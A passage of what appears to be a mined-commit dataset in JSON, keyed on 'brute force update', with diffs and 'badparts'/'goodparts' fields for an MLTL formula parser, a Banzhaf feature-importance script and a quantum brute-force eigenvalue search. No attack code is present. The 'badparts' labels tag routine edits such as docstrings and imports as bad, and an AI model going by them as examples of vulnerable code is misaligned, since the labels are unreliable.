str(primary_binary_conn(wff)))","    print(\"primary_interval: \" + str(primary_interval(wff)))"],"goodparts":[]}],"source":"\nfrom Custom_notation import * \"\"\" This file implements the following Context-Free Grammar for a well-formed formula for MLTL: Digit -> \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019 Num -> Digit Num | Digit Interval -> \u2018[\u2019 Num \u2018,\u2019 Num \u2018]\u2019 Prop_var -> \u2018p\u2019 Num Prop_cons -> \u2018T\u2019 | \u2018F\u2019 Unary_Prop_conn -> \u2018~\u2019 Binary_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019 Temp_cons -> \u2018S\u2019 Unary_Temp_conn -> \u2018E\u2019 | \u2018A\u2019 Binary_Temp_conn -> \u2018U\u2019 | \u2018W\u2019 Wff -> Prop_var | Prop_cons | Temp_cons | Unary_Prop_conn Wff | Unary_Temp_conn Interval Wff | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\u2019 The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019. The Unary Prop connective: Negation is represented by: \u2018~\u2019. The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019. The Temp constant: Start is represented by: \u2018S\u2019. The Unary Temp connectives: Next, Eventually, Always are represented by: \u2018N\u2019, \u2018E\u2019, \u2018A\u2019. The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018W\u2019. \"\"\" def Digit_check(s): return s=='0' or s=='1' or s=='2' or s=='3' or s=='4' or s=='5' or s=='6' or s=='7' or s=='8' or s=='9' def Num_check(s): len_s=len(s) if(len_s==1): return Digit_check(s) char=Slice_char(s, 0) alpha=Slice(s, 1, len_s-1) return Digit_check(char) and Num_check(alpha) def Interval_check(s): len_s=len(s) left_bracket=Slice_char(s, 0) right_bracket=Slice_char(s, len_s-1) comma_index=1 while(Num_check(Slice(s, 1, comma_index)) and comma_index <=len_s-1): comma_index=comma_index +1 num_1=Slice(s, 1, comma_index-1) comma=Slice_char(s, comma_index) num_2=Slice(s, comma_index+1, len_s-2) return left_bracket=='[' and Num_check(num_1) and comma==',' and Num_check(num_2) and right_bracket==']' def Prop_var_check(s): len_s=len(s) char=Slice_char(s, 0) alpha=Slice(s, 1, len_s-1) return char=='p' and Num_check(alpha) def Prop_cons_check(s): return s=='T' or s=='F' def Unary_Prop_conn_check(s): return s=='~' def Binary_Prop_conn_check(s): return s=='v' or s=='&' or s=='=' or s=='>' def Temp_cons_check(s): return s=='S' def Unary_Temp_conn_check(s): return s=='E' or s=='A' def Binary_Temp_conn_check(s): return s=='U' or s=='W' def Wff_check(s): len_s=len(s) if(Prop_var_check(s) or Prop_cons_check(s) or Temp_cons_check(s)): return True if(Unary_Prop_conn_check(Slice_char(s, 0))): alpha=Slice(s, 1, len_s-1) return Wff_check(alpha) if(Unary_Temp_conn_check(Slice_char(s, 0))): begin_interval=1 end_interval=2 while(Slice_char(s, end_interval) !=']' and end_interval <=len_s-1): end_interval=end_interval +1 interval=Slice(s, begin_interval, end_interval) alpha=Slice(s, end_interval+1, len_s-1) return Interval_check(interval) and Wff_check(alpha) if(Slice_char(s, 0)=='(' and Slice_char(s, len_s-1)==')'): left_count=0 right_count=0 for binary_conn_index in Range(1, len_s-1, 1): char=Slice_char(s, binary_conn_index) if(char=='('): left_count=left_count +1 if(char==')'): right_count=right_count +1 if(left_count==right_count and(Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))): break binary_conn=Slice_char(s, binary_conn_index) if(Binary_Prop_conn_check(binary_conn)): alpha=Slice(s, 1, binary_conn_index-1) beta=Slice(s, binary_conn_index+1, len_s-2) return Wff_check(alpha) and Wff_check(beta) if(Binary_Temp_conn_check(binary_conn)): begin_interval=binary_conn_index+1 end_interval=binary_conn_index+2 while(Slice_char(s, end_interval) !=']' and end_interval <=len_s-1): end_interval=end_interval +1 alpha=Slice(s, 1, binary_conn_index-1) interval=Slice(s, begin_interval, end_interval) beta=Slice(s, end_interval+1, len_s-2) return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta) return False def primary_binary_conn(wff): len_wff=len(wff) if(Slice_char(wff, 0)=='(' and Slice_char(wff, len_wff-1)==')'): left_count=0 right_count=0 for binary_conn_index in Range(1, len_wff-1, 1): char=Slice_char(wff, binary_conn_index) if(char=='('): left_count=left_count +1 if(char==')'): right_count=right_count +1 if(left_count==right_count and(Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))): break return binary_conn_index return -1 def primary_interval(wff): len_wff=len(wff) if(Unary_Temp_conn_check(Slice_char(wff, 0))): begin_interval=1 comma_index=begin_interval+1 while(Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <=len_wff-1): comma_index=comma_index+1 end_interval=comma_index+1 while(Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <=len_wff-1): end_interval=end_interval +1 return(begin_interval, comma_index, end_interval) binary_conn_index=primary_binary_conn(wff) if(Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))): begin_interval=binary_conn_index+1 comma_index=begin_interval+1 while(Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <=len_wff-1): comma_index=comma_index+1 end_interval=comma_index+1 while(Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <=len_wff-1): end_interval=end_interval +1 return(begin_interval, comma_index, end_interval) return -1 if __name__==\"__main__\": wff=input(\"Enter MLTL formula: \") wff=strip_whitespace(wff) assert(Wff_check(wff)), \"Not a well-formed formula\" print(\"primary_binary_conn: \" +str(primary_binary_conn(wff))) print(\"primary_interval: \" +str(primary_interval(wff))) ","sourceWithComments":"from Custom_notation import *\n\n\"\"\"\nThis file implements the following Context-Free Grammar\nfor a well-formed formula for MLTL:\n\nDigit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\nNum  ->  Digit Num |  Digit\nInterval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\nProp_var  ->  \u2018p\u2019 Num\n\nProp_cons  ->  \u2018T\u2019 | \u2018F\u2019\nUnary_Prop_conn  ->  \u2018~\u2019\nBinary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n\nTemp_cons  ->  \u2018S\u2019\nUnary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\nBinary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\n\n\nWff  ->  Prop_var | Prop_cons | Temp_cons\n                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\u2019\n\n\n\nThe Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.\nThe Unary Prop connective: Negation is represented by: \u2018~\u2019.\nThe Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.\n\nThe Temp constant: Start is represented by: \u2018S\u2019.\nThe Unary Temp connectives: Next, Eventually, Always are represented by: \u2018N\u2019, \u2018E\u2019, \u2018A\u2019.\nThe Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018W\u2019.\n\n\"\"\"\n\n\n# Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\ndef Digit_check(s):\n    return s == '0' or s == '1' or s == '2' or s == '3' or s == '4' or s == '5' or s == '6' or s == '7' or s == '8' or s == '9'\n\n\n# Num  ->  Digit Num |  Digit\ndef Num_check(s):\n    len_s = len(s)\n    if (len_s == 1):\n        return Digit_check(s)\n\n    char = Slice_char(s, 0)\n    alpha = Slice(s, 1, len_s-1)\n    return Digit_check(char) and Num_check(alpha)\n\n\n# Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\ndef Interval_check(s):\n    len_s = len(s)\n\n    left_bracket = Slice_char(s, 0)\n    right_bracket = Slice_char(s, len_s-1)\n\n    # Parse for comma index\n    comma_index = 1\n    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1):\n        comma_index = comma_index + 1\n\n    num_1 = Slice(s, 1, comma_index-1)\n    comma = Slice_char(s, comma_index)\n    num_2 = Slice(s, comma_index+1, len_s-2)\n    return left_bracket == '[' and Num_check(num_1) and comma == ',' and Num_check(num_2) and right_bracket == ']'\n\n\n# Prop_var  ->  \u2018p\u2019 Num\ndef Prop_var_check(s):\n    len_s = len(s)\n\n    char = Slice_char(s, 0)\n    alpha = Slice(s, 1, len_s-1)\n    return char == 'p' and Num_check(alpha)\n\n\n# Prop_cons  ->  \u2018T\u2019 | \u2018F\u2019\ndef Prop_cons_check(s):\n    return s == 'T' or s == 'F'\n\n\n# Unary_Prop_conn  ->  \u2018~\u2019\ndef Unary_Prop_conn_check(s):\n    return s == '~'\n\n\n# Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\ndef Binary_Prop_conn_check(s):\n    return s == 'v' or s == '&' or s == '=' or s == '>'\n\n\n# Temp_cons  ->  \u2018S\u2019\ndef Temp_cons_check(s):\n    return s == 'S'\n\n# Unary_Temp_conn  ->  \u2018E\u2019 | \u2018A\u2019\ndef Unary_Temp_conn_check(s):\n    return s == 'E' or s == 'A'\n\n\n# Binary_Temp_conn  ->  \u2018U\u2019 | \u2018W\u2019\ndef Binary_Temp_conn_check(s):\n    return s == 'U' or s == 'W'\n\n\n\n# Wff  ->  Prop_var | Prop_cons | Temp_cons\n#                   | Unary_Prop_conn Wff | Unary_Temp_conn  Interval  Wff\n#                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\u2019\n\ndef Wff_check(s):\n    len_s = len(s)\n\n    # Prop_var | Prop_cons | Temp_cons\n    if (Prop_var_check(s) or Prop_cons_check(s) or Temp_cons_check(s)):\n        return True\n\n    # Unary_Prop_conn Wff\n    if (Unary_Prop_conn_check(Slice_char(s, 0))):\n        alpha = Slice(s, 1, len_s-1)\n        return  Wff_check(alpha)\n\n    # Unary_Temp_conn  Interval  Wff\n    if (Unary_Temp_conn_check(Slice_char(s, 0))):\n        begin_interval = 1\n        end_interval = 2\n\n        # Parse for end of interval\n        while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n            end_interval = end_interval + 1\n\n        interval = Slice(s, begin_interval, end_interval)\n        alpha = Slice(s, end_interval+1, len_s-1)\n        return Interval_check(interval) and Wff_check(alpha)\n\n    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n    if (Slice_char(s, 0) == '(' and Slice_char(s, len_s-1) == ')'):\n\n        # Number of '(' in s\n        left_count = 0\n        # Number of ')' in s\n        right_count = 0\n\n\n        #    Parse for binary_conn_index in s\n\n        #    When left_count == right_count and s[binary_conn_index] is a binary connective,\n        #    we are done parsing and have found binary_conn_index.\n\n        for binary_conn_index in Range(1, len_s-1, 1):\n            char = Slice_char(s, binary_conn_index)\n\n            if(char == '('):\n                left_count = left_count + 1\n\n            if(char == ')'):\n                right_count = right_count + 1\n\n            # Done parsing for binary_conn_index.\n            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n                break\n\n        binary_conn = Slice_char(s, binary_conn_index)\n\n        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n        if (Binary_Prop_conn_check(binary_conn)):\n            alpha = Slice(s, 1, binary_conn_index-1)\n            beta = Slice(s, binary_conn_index+1, len_s-2)\n            return Wff_check(alpha) and Wff_check(beta)\n\n        # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n        if (Binary_Temp_conn_check(binary_conn)):\n            begin_interval = binary_conn_index+1\n            end_interval = binary_conn_index+2\n\n            # Parse for end of interval\n            while (Slice_char(s, end_interval) != ']' and end_interval <= len_s-1):\n                end_interval = end_interval + 1\n\n            alpha = Slice(s, 1, binary_conn_index-1)\n            interval = Slice(s, begin_interval, end_interval)\n            beta = Slice(s, end_interval+1, len_s-2)\n            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta)\n\n    return False\n\n\n# Given a well-formed MLTL formula wff,\n# return the index of the primary binary connective.\n# If this does not occur, return -1.\ndef primary_binary_conn(wff):\n    len_wff = len(wff)\n\n    if (Slice_char(wff, 0) == '(' and Slice_char(wff, len_wff-1) == ')'):\n        left_count = 0\n        right_count = 0\n\n        for binary_conn_index in Range(1, len_wff-1, 1):\n            char = Slice_char(wff, binary_conn_index)\n\n            if(char == '('):\n                left_count = left_count + 1\n\n            if(char == ')'):\n                right_count = right_count + 1\n\n            if(left_count == right_count and (Binary_Prop_conn_check(char) or Binary_Temp_conn_check(char))):\n                break\n\n        return binary_conn_index\n\n    return -1\n\n\n# Given a well-formed MLTL formula wff,\n# return the tuple (begin_interval, comma_index, end_interval), giving the indexs\n# for the primary interval occuring in the formula.\n# This makes parsing for the temporal indexs easy.\n#\n# If there is no primary interval for the formula, return -1.\ndef primary_interval(wff):\n    len_wff = len(wff)\n\n    # Unary_Temp_conn  Interval  Wff\n    if (Unary_Temp_conn_check(Slice_char(wff, 0))):\n        begin_interval = 1\n\n        # Parse for comma_index\n        comma_index = begin_interval+1\n        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n            comma_index = comma_index+1\n\n        # Parse for end_interval\n        end_interval = comma_index+1\n        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n            end_interval = end_interval + 1\n\n        return (begin_interval, comma_index, end_interval)\n\n\n    # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n    binary_conn_index = primary_binary_conn(wff)\n    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))):\n        begin_interval = binary_conn_index+1\n\n        # Parse for comma_index\n        comma_index = begin_interval+1\n        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n            comma_index = comma_index+1\n\n        # Parse for end_interval\n        end_interval = comma_index+1\n        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n            end_interval = end_interval + 1\n\n        return (begin_interval, comma_index, end_interval)\n\n\n    return -1\n\n\n\n\n# Test Wff_check, primary_binary_conn, and primary_interval functions.\nif __name__ == \"__main__\":\n    wff = input (\"Enter MLTL formula : \")\n    wff = strip_whitespace(wff)\n    assert (Wff_check(wff)), \"Not a well-formed formula\"\n\n    print(\"primary_binary_conn: \" + str(primary_binary_conn(wff)))\n    print(\"primary_interval: \" + str(primary_interval(wff)))\n"}},"msg":"Updating python brute-forcer"}},"https:\/\/github.com\/abdessalam-eddib\/computing_banzhaf":{"1a4558245db8d8b275d06fa5cbf3822f43bbd60d":{"url":"https:\/\/api.github.com\/repos\/abdessalam-eddib\/computing_banzhaf\/commits\/1a4558245db8d8b275d06fa5cbf3822f43bbd60d","html_url":"https:\/\/github.com\/abdessalam-eddib\/computing_banzhaf\/commit\/1a4558245db8d8b275d06fa5cbf3822f43bbd60d","message":"Update brute-force.py","sha":"1a4558245db8d8b275d06fa5cbf3822f43bbd60d","keyword":"brute force update","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex f6e938e..fd93bc7 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -6,6 +6,10 @@ def pred_tree_d(clf, coalition, row, row_d):\n     \"\"\"\r\n         The following function computes the characteristic function \r\n         We used the masking technique described in our report\r\n+        clf : ml model we used for predictions\r\n+        coalition : the features that constitute the coalition\r\n+        row : the observation for which we'll compute the banzhaf values\r\n+        row_d : our mask as explained in the report\r\n     \"\"\"\r\n     hs = []\r\n     for j in list(row.index):\r\n@@ -18,6 +22,10 @@ def pred_tree_d(clf, coalition, row, row_d):\n def make_value_function(clf, row, col, df):\r\n     \"\"\"\r\n         Returns a function that computes the marginal gain of a feature\r\n+        clf : ml model we used for predictions\r\n+        row : observation\r\n+        col : column, that we want to determine its importanc\r\n+        df : the dataframe\r\n     \"\"\"\r\n     def value(c):\r\n         d = 1000 #pick a number 100 - 1000\r\n@@ -33,6 +41,8 @@ def value(c):\n def make_coalitions(row, col):\r\n     \"\"\"\r\n         The following function generates all possible coalitions of features exluding \"col\"\r\n+        row : the observation for which we cant to compute banzhaf values\r\n+        col : the col we exclude in the coalitions\r\n     \"\"\"\r\n     rest = [x for x in row.index if x != col]\r\n     for i in range(len(rest) + 1):\r\n@@ -43,7 +53,8 @@ def compute_banzhaf(clf, row, col, df):\n     \"\"\"\r\n         The following function computes the banzhaf values for a given observation \"row\", using the formula explicited in\r\n         our report\r\n+        clf, row, col, df as described earlier\r\n     \"\"\"\r\n     v = make_value_function(clf, row, col, df)\r\n     result = sum([v(coal) \/ (2 ** (len(row) - 1)) for coal in make_coalitions(row, col)])\r\n-    return result\n\\ No newline at end of file\n+    return result\r\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n     \"\"\"\r\n         The following function computes the banzhaf values for a given observation \"row\", using the formula explicited in\r\n         our report\r\n+        clf, row, col, df as described earlier\r\n     \"\"\"\r\n     v = make_value_function(clf, row, col, df)\r\n     result = sum([v(coal) \/ (2 ** (len(row) - 1)) for coal in make_coalitions(row, col)])\r\n-    return result\n\\ No newline at end of file\n+    return result\r\n","add":2,"remove":1,"filename":"\/brute-force.py","badparts":["    return result"],"goodparts":["        clf, row, col, df as described earlier\r","    return result\r"]}],"source":"\nimport time\r import random \r from itertools import combinations\r \r def pred_tree_d(clf, coalition, row, row_d):\r \"\"\"\r The following function computes the characteristic function \r We used the masking technique described in our report\r \"\"\"\r hs=[]\r for j in list(row.index):\r if j in coalition:\r hs.append(row[j])\r else:\r hs.append(row_d[j])\r return clf.predict([hs])\r \r def make_value_function(clf, row, col, df):\r \"\"\"\r Returns a function that computes the marginal gain of a feature\r \"\"\"\r def value(c):\r d=1000 marginal_gain=0\r for i in range(d):\r random.seed(int(time.time()) +i)\r ind=random.randint(0, df.shape[0] -1)\r row_d=df[ind:ind+1].T.squeeze()\r marginal_gain +=pred_tree_d(clf, c +[col], row, row_d) -pred_tree_d(clf, c, row, row_d)\r return marginal_gain\/d\r return value\r \r def make_coalitions(row, col):\r \"\"\"\r The following function generates all possible coalitions of features exluding \"col\"\r \"\"\"\r rest=[x for x in row.index if x !=col]\r for i in range(len(rest) +1):\r for x in combinations(rest, i):\r yield list(x)\r \r def compute_banzhaf(clf, row, col, df):\r \"\"\"\r The following function computes the banzhaf values for a given observation \"row\", using the formula explicited in\r our report\r \"\"\"\r v=make_value_function(clf, row, col, df)\r result=sum([v(coal) \/(2 **(len(row) -1)) for coal in make_coalitions(row, col)])\r return result ","sourceWithComments":"import time\r\nimport random \r\nfrom itertools import combinations\r\n    \r\ndef pred_tree_d(clf, coalition, row, row_d):\r\n    \"\"\"\r\n        The following function computes the characteristic function \r\n        We used the masking technique described in our report\r\n    \"\"\"\r\n    hs = []\r\n    for j in list(row.index):\r\n        if j in coalition:\r\n            hs.append(row[j])\r\n        else:\r\n            hs.append(row_d[j])\r\n    return clf.predict([hs])\r\n\r\ndef make_value_function(clf, row, col, df):\r\n    \"\"\"\r\n        Returns a function that computes the marginal gain of a feature\r\n    \"\"\"\r\n    def value(c):\r\n        d = 1000 #pick a number 100 - 1000\r\n        marginal_gain = 0\r\n        for i in range(d):\r\n            random.seed(int(time.time()) + i)\r\n            ind = random.randint(0, df.shape[0] - 1)\r\n            row_d = df[ind:ind+1].T.squeeze()\r\n            marginal_gain += pred_tree_d(clf, c + [col], row, row_d) - pred_tree_d(clf, c, row, row_d)\r\n        return marginal_gain\/d\r\n    return value\r\n\r\ndef make_coalitions(row, col):\r\n    \"\"\"\r\n        The following function generates all possible coalitions of features exluding \"col\"\r\n    \"\"\"\r\n    rest = [x for x in row.index if x != col]\r\n    for i in range(len(rest) + 1):\r\n        for x in combinations(rest, i):\r\n            yield list(x)\r\n        \r\ndef compute_banzhaf(clf, row, col, df):\r\n    \"\"\"\r\n        The following function computes the banzhaf values for a given observation \"row\", using the formula explicited in\r\n        our report\r\n    \"\"\"\r\n    v = make_value_function(clf, row, col, df)\r\n    result = sum([v(coal) \/ (2 ** (len(row) - 1)) for coal in make_coalitions(row, col)])\r\n    return result"}},"msg":"Update brute-force.py"}},"https:\/\/github.com\/UCL-CCS\/symmer":{"21a3a9e3fa8227fed09fb4e15c77b5ee9f5b61fc":{"url":"https:\/\/api.github.com\/repos\/UCL-CCS\/symmer\/commits\/21a3a9e3fa8227fed09fb4e15c77b5ee9f5b61fc","html_url":"https:\/\/github.com\/UCL-CCS\/symmer\/commit\/21a3a9e3fa8227fed09fb4e15c77b5ee9f5b61fc","message":"Updated NoncontextualOp so that only the symmetry generators that have the reference state as an eigenvalue are fixed - the remaining symmetry generators are solved via brute force.","sha":"21a3a9e3fa8227fed09fb4e15c77b5ee9f5b61fc","keyword":"brute force update","diff":"diff --git a\/symmer\/symplectic\/noncontextual_op.py b\/symmer\/symplectic\/noncontextual_op.py\nindex e7f08b7..14912a9 100644\n--- a\/symmer\/symplectic\/noncontextual_op.py\n+++ b\/symmer\/symplectic\/noncontextual_op.py\n@@ -4,7 +4,7 @@\n from cached_property import cached_property\n from deco import concurrent, synchronized\n from scipy.optimize import differential_evolution, shgo\n-from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp\n+from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp, QuantumState\n from symmer.symplectic.utils import unit_n_sphere_cartesian_coords\n import itertools\n \n@@ -295,12 +295,27 @@ def _convex_problem(self, nu):\n \n     def _energy_via_ref_state(self, ref_state):\n         \"\"\" Given a reference state such as Hartree-Fock, fix the symmetry generator eigenvalues\n+        Currently only implemented for single reference basis states in the Z basis\n         \"\"\"\n         # update the symmetry generator G coefficients w.r.t. the reference state\n-        self.symmetry_generators.update_sector(ref_state=ref_state)\n-        fix_nu = self.symmetry_generators.coeff_vec\n-        energy, r_optimal = self._convex_problem(fix_nu)\n-        return energy, fix_nu, r_optimal\n+        fixed_indices = []\n+        fixed_eigvals = []\n+        unfixed_indices = []\n+\n+        ref_psi = QuantumState([ref_state])\n+        for index, S in enumerate(self.symmetry_generators):\n+            S.coeff_vec[0]=1\n+            S_psi = S*ref_psi\n+            # if the reference is an eigenstate of S, fix the eigenvalue\n+            if np.all(S_psi.state_matrix==ref_psi.state_matrix):\n+                eigval = int(S_psi.state_op.coeff_vec[0].real)\n+                fixed_indices.append(index)\n+                fixed_eigvals.append(eigval)\n+            else:\n+                unfixed_indices.append(index)\n+\n+        # any remaining unfixed symmetry generators are solved via brute force:\n+        return self._energy_via_brute_force(fixed_indices, fixed_eigvals)\n \n     def _energy_via_relaxation(self):\n         \"\"\" Relax the binary value assignment of symmetry generators to continuous variables\n@@ -314,32 +329,48 @@ def _energy_via_relaxation(self):\n         energy, r_optimal = self._convex_problem(fix_nu)\n         return energy, fix_nu, r_optimal\n \n-    def _energy_via_brute_force(self):\n+    def _energy_via_brute_force(self, fixed_indices=None, fixed_eigvals=None):\n         \"\"\" Does what is says on the tin! Try every single eigenvalue assignment in parallel\n         and return the minimizing noncontextual configuration. This scales exponentially in \n         the number of qubits.\n         \"\"\"\n+        \n+        # allow certain indices to be fixed while performing a brute force search over those remaining\n+        if fixed_indices is None:\n+            fixed_indices = np.array([], dtype=int)\n+            fixed_eigvals = np.array([], dtype=int)\n+        else:\n+            assert fixed_eigvals is not None, 'Must specify the eigenvalues to fix.'\n+            assert len(fixed_indices) == len(fixed_eigvals), 'Length of eigvals does not match the fixed index list.'\n+            fixed_indices = np.asarray(fixed_indices, dtype=int)\n+            fixed_eigvals = np.asarray(fixed_eigvals, dtype=int)\n \n-        global _func # so concurrent object is avialable in synchronized routine\n+        global unfixed_indices, nu, _func # so concurrent object is avialable in synchronized routine\n \n+        nu = np.ones(self.symmetry_generators.n_terms, dtype=int)\n+        nu[fixed_indices] = fixed_eigvals\n+        unfixed_indices = np.setdiff1d(np.arange(self.symmetry_generators.n_terms),fixed_indices)    \n+                \n         # wrap the convex optimization problem for compatibility with deco\n         @concurrent\n-        def _func(obj, nu):\n+        def _func(obj, nu_unfixed):\n+            nu[unfixed_indices] = nu_unfixed\n             return obj._convex_problem(nu)\n \n         @synchronized\n         def func(self):\n             # optimize over all discrete value assignments of nu in parallel\n             tracker = []\n-            nu_list = list(itertools.product([-1,1],repeat=self.symmetry_generators.n_terms))\n-            for nu in nu_list:\n-                tracker.append(_func(self, np.array(nu)))\n+            nu_list = list(itertools.product([-1,1],repeat=len(unfixed_indices)))\n+            for nu_unfixed in nu_list:\n+                tracker.append(_func(self, np.asarray(nu_unfixed, dtype=int)))\n             return zip(tracker, nu_list)\n-        \n+\n         full_search_results = func(self)\n         (energy, r_optimal), fix_nu = min(full_search_results, key=lambda x:x[0][0])\n+        nu[unfixed_indices] = fix_nu\n         \n-        return energy, fix_nu, r_optimal\n+        return energy, nu, r_optimal\n \n     def solve(self, strategy='brute_force', ref_state: np.array = None) -> None:\n         \"\"\" Minimize the classical objective function, yielding the noncontextual ground state\n","files":{"\/symmer\/symplectic\/noncontextual_op.py":{"changes":[{"diff":"\n from cached_property import cached_property\n from deco import concurrent, synchronized\n from scipy.optimize import differential_evolution, shgo\n-from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp\n+from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp, QuantumState\n from symmer.symplectic.utils import unit_n_sphere_cartesian_coords\n import itertools\n \n","add":1,"remove":1,"filename":"\/symmer\/symplectic\/noncontextual_op.py","badparts":["from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp"],"goodparts":["from symmer.symplectic import PauliwordOp, StabilizerOp, AntiCommutingOp, QuantumState"]},{"diff":"\n \n     def _energy_via_ref_state(self, ref_state):\n         \"\"\" Given a reference state such as Hartree-Fock, fix the symmetry generator eigenvalues\n+        Currently only implemented for single reference basis states in the Z basis\n         \"\"\"\n         # update the symmetry generator G coefficients w.r.t. the reference state\n-        self.symmetry_generators.update_sector(ref_state=ref_state)\n-        fix_nu = self.symmetry_generators.coeff_vec\n-        energy, r_optimal = self._convex_problem(fix_nu)\n-        return energy, fix_nu, r_optimal\n+        fixed_indices = []\n+        fixed_eigvals = []\n+        unfixed_indices = []\n+\n+        ref_psi = QuantumState([ref_state])\n+        for index, S in enumerate(self.symmetry_generators):\n+            S.coeff_vec[0]=1\n+            S_psi = S*ref_psi\n+            # if the reference is an eigenstate of S, fix the eigenvalue\n+            if np.all(S_psi.state_matrix==ref_psi.state_matrix):\n+                eigval = int(S_psi.state_op.coeff_vec[0].real)\n+                fixed_indices.append(index)\n+                fixed_eigvals.append(eigval)\n+            else:\n+                unfixed_indices.append(index)\n+\n+        # any remaining unfixed symmetry generators are solved via brute force:\n+        return self._energy_via_brute_force(fixed_indices, fixed_eigvals)\n \n     def _energy_via_relaxation(self):\n         \"\"\" Relax the binary value assignment of symmetry generators to continuous variables\n","add":19,"remove":4,"filename":"\/symmer\/symplectic\/noncontextual_op.py","badparts":["        self.symmetry_generators.update_sector(ref_state=ref_state)","        fix_nu = self.symmetry_generators.coeff_vec","        energy, r_optimal = self._convex_problem(fix_nu)","        return energy, fix_nu, r_optimal"],"goodparts":["        Currently only implemented for single reference basis states in the Z basis","        fixed_indices = []","        fixed_eigvals = []","        unfixed_indices = []","        ref_psi = QuantumState([ref_state])","        for index, S in enumerate(self.symmetry_generators):","            S.coeff_vec[0]=1","            S_psi = S*ref_psi","            if np.all(S_psi.state_matrix==ref_psi.state_matrix):","                eigval = int(S_psi.state_op.coeff_vec[0].real)","                fixed_indices.append(index)","                fixed_eigvals.append(eigval)","            else:","                unfixed_indices.append(index)","        return self._energy_via_brute_force(fixed_indices, fixed_eigvals)"]},{"diff":"\n         energy, r_optimal = self._convex_problem(fix_nu)\n         return energy, fix_nu, r_optimal\n \n-    def _energy_via_brute_force(self):\n+    def _energy_via_brute_force(self, fixed_indices=None, fixed_eigvals=None):\n         \"\"\" Does what is says on the tin! Try every single eigenvalue assignment in parallel\n         and return the minimizing noncontextual configuration. This scales exponentially in \n         the number of qubits.\n         \"\"\"\n+        \n+        # allow certain indices to be fixed while performing a brute force search over those remaining\n+        if fixed_indices is None:\n+            fixed_indices = np.array([], dtype=int)\n+            fixed_eigvals = np.array([], dtype=int)\n+        else:\n+            assert fixed_eigvals is not None, 'Must specify the eigenvalues to fix.'\n+            assert len(fixed_indices) == len(fixed_eigvals), 'Length of eigvals does not match the fixed index list.'\n+            fixed_indices = np.asarray(fixed_indices, dtype=int)\n+            fixed_eigvals = np.asarray(fixed_eigvals, dtype=int)\n \n-        global _func # so concurrent object is avialable in synchronized routine\n+        global unfixed_indices, nu, _func # so concurrent object is avialable in synchronized routine\n \n+        nu = np.ones(self.symmetry_generators.n_terms, dtype=int)\n+        nu[fixed_indices] = fixed_eigvals\n+        unfixed_indices = np.setdiff1d(np.arange(self.symmetry_generators.n_terms),fixed_indices)    \n+                \n         # wrap the convex optimization problem for compatibility with deco\n         @concurrent\n-        def _func(obj, nu):\n+        def _func(obj, nu_unfixed):\n+            nu[unfixed_indices] = nu_unfixed\n             return obj._convex_problem(nu)\n \n         @synchronized\n         def func(self):\n             # optimize over all discrete value assignments of nu in parallel\n             tracker = []\n-            nu_list = list(itertools.product([-1,1],repeat=self.symmetry_generators.n_terms))\n-            for nu in nu_list:\n-                tracker.append(_func(self, np.array(nu)))\n+            nu_list = 